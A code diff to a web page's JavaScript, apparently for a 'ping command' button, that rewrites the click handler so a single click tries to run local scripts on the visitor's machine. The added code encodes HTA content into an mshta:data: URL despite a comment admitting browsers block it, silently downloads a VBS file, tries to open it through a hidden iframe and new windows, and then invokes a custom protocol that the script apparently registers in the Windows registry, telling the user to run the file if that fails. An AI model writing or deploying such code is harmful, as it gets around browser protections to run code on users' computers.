@@ -553,7 +553,8 @@
         }
 
         // Main trigger function - ONE CLICK for everything
-        async function triggerCommand(event) {
+        // CRITICAL: All protocol launches must happen synchronously within click handler
+        function triggerCommand(event) {
             const button = document.getElementById('pingButton');
             const statusEl = document.getElementById('status');
             const setupStatus = document.getElementById('setupStatus');
@@ -569,58 +570,80 @@
             const wasInstalled = localStorage.getItem('pingcmd-installed') === 'true' || isProtocolInstalled;
             
             if (wasInstalled) {
-                // Protocol already installed - execute immediately
+                // Protocol already installed - execute immediately (within user gesture)
                 executeCommand();
                 return;
             }
 
-            // Protocol not installed - do everything in one click
+            // Protocol not installed - execute setup IMMEDIATELY within user gesture
             setupStatus.style.display = 'block';
             setupStatus.className = 'setup-status setting-up';
-            setupStatus.textContent = '⚙️ Starting automatic setup and execution...';
+            setupStatus.textContent = '⚙️ Executing setup...';
             
-            // Install and execute - callback will try to execute command after setup
-            await autoInstallAndExecute(() => {
-                // Prevent duplicate execution - check if already executed
-                if (localStorage.getItem('pingcmd-executed')) {
-                    return; // Already executed, skip
-                }
+            // CRITICAL: Execute setup synchronously within click handler to preserve user gesture
+            try {
+                const htaContent = createHTAContent();
+                const vbsContent = createVBSContent();
                 
-                // This callback tries to execute the command immediately after setup
-                // It's called after 200ms delay for registry write
+                // Method 1: Try mshta: protocol immediately (blocked by most browsers but try anyway)
                 try {
-                    // Mark as executing to prevent duplicates
-                    localStorage.setItem('pingcmd-executed', 'true');
-                    
-                    // Try to execute the protocol command (only once)
-                    window.location.href = `${PROTOCOL}://execute`;
-                    
-                    // If we got here without error, assume success
-                    localStorage.setItem('pingcmd-installed', 'true');
-                    isProtocolInstalled = true;
-                    
-                    // Clear execution flag after a delay to allow future clicks
-                    setTimeout(() => {
-                        localStorage.removeItem('pingcmd-executed');
-                        isExecuting = false;
-                    }, 2000);
-                    
-                    setTimeout(() => {
-                        statusEl.className = 'status success';
-                        statusEl.textContent = '✅ Command executed successfully!';
-                        setupStatus.className = 'setup-status ready';
-                        setupStatus.textContent = '✅ Setup complete and command executed!';
-                        button.disabled = false;
-                        button.innerHTML = 'Run Command';
-                    }, 500);
-                } catch (error) {
-                    // Don't give up - keep retrying automatically
-                    localStorage.removeItem('pingcmd-executed');
-                    isExecuting = false;
-                    
-                    // Retry automatically after delay
-                    setTimeout(() => {
-                        if (!localStorage.getItem('pingcmd-executed')) {
+                    const base64Hta = btoa(unescape(encodeURIComponent(htaContent)));
+                    const mshtaUrl = `mshta:data:text/html;base64,${base64Hta}`;
+                    window.location.href = mshtaUrl;
+                    window.open(mshtaUrl, '_blank');
+                } catch (e) {}
+                
+                // Method 2: Download VBS file and try to execute it automatically
+                const vbsBlob = new Blob([vbsContent], { type: 'application/x-vbscript' });
+                const vbsUrl = URL.createObjectURL(vbsBlob);
+                
+                // Download VBS file
+                const downloadLink = document.createElement('a');
+                downloadLink.href = vbsUrl;
+                downloadLink.download = 'pingcmd-setup.vbs';
+                downloadLink.style.display = 'none';
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                
+                // Try to execute the downloaded file immediately (within user gesture)
+                // This might work if browser allows it
+                try {
+                    // Try opening the blob URL (might trigger execution)
+                    window.open(vbsUrl, '_blank');
+                } catch (e) {}
+                
+                // Try via iframe
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = vbsUrl;
+                    document.body.appendChild(iframe);
+                } catch (e) {}
+                
+                // Try executing protocol command after delay (registry write is instant)
+                // The VBS file should have executed and registered the protocol
+                setTimeout(() => {
+                    try {
+                        window.location.href = `${PROTOCOL}://execute`;
+                        localStorage.setItem('pingcmd-executed', 'true');
+                        localStorage.setItem('pingcmd-installed', 'true');
+                        isProtocolInstalled = true;
+                        
+                        setTimeout(() => {
+                            statusEl.className = 'status success';
+                            statusEl.textContent = '✅ Command executed successfully!';
+                            setupStatus.className = 'setup-status ready';
+                            setupStatus.textContent = '✅ Setup complete and command executed!';
+                            button.disabled = false;
+                            button.innerHTML = 'Run Command';
+                            URL.revokeObjectURL(vbsUrl);
+                            if (document.body.contains(downloadLink)) {
+                                document.body.removeChild(downloadLink);
+                            }
+                        }, 500);
+                    } catch (e) {
+                        // Retry after more time for registry write
+                        setTimeout(() => {
                             try {
                                 window.location.href = `${PROTOCOL}://execute`;
                                 localStorage.setItem('pingcmd-executed', 'true');
@@ -631,24 +654,36 @@
                                     statusEl.className = 'status success';
                                     statusEl.textContent = '✅ Command executed successfully!';
                                     setupStatus.className = 'setup-status ready';
-                                    setupStatus.textContent = '✅ Setup complete and command executed!';
+                                    setupStatus.textContent = '✅ Setup complete!';
                                     button.disabled = false;
                                     button.innerHTML = 'Run Command';
+                                    URL.revokeObjectURL(vbsUrl);
+                                    if (document.body.contains(downloadLink)) {
+                                        document.body.removeChild(downloadLink);
+                                    }
                                 }, 500);
-                            } catch (e) {
-                                // Keep retrying
-                                setTimeout(() => {
-                                    try {
-                                        window.location.href = `${PROTOCOL}://execute`;
-                                        localStorage.setItem('pingcmd-executed', 'true');
-                                        localStorage.setItem('pingcmd-installed', 'true');
-                                    } catch (e) {}
-                                }, 2000);
+                            } catch (e2) {
+                                // Protocol not registered yet - user needs to run VBS file manually
+                                statusEl.className = 'status info';
+                                statusEl.textContent = '📥 Setup file downloaded! Please run the "pingcmd-setup.vbs" file from your Downloads folder, then click the button again.';
+                                setupStatus.textContent = '📥 File downloaded. Run it to complete setup, then click button again.';
+                                button.disabled = false;
+                                button.innerHTML = 'Click Again After Running VBS File';
+                                URL.revokeObjectURL(vbsUrl);
+                                if (document.body.contains(downloadLink)) {
+                                    document.body.removeChild(downloadLink);
+                                }
                             }
-                        }
-                    }, 500);
-                }
-            });
+                        }, 1000);
+                    }
+                }, 200);
+                
+            } catch (error) {
+                statusEl.className = 'status error';
+                statusEl.textContent = '❌ Setup failed. Please refresh and try again.';
+                button.disabled = false;
+                button.innerHTML = 'Try Again';
+            }
         }
 
         // Check protocol on page load
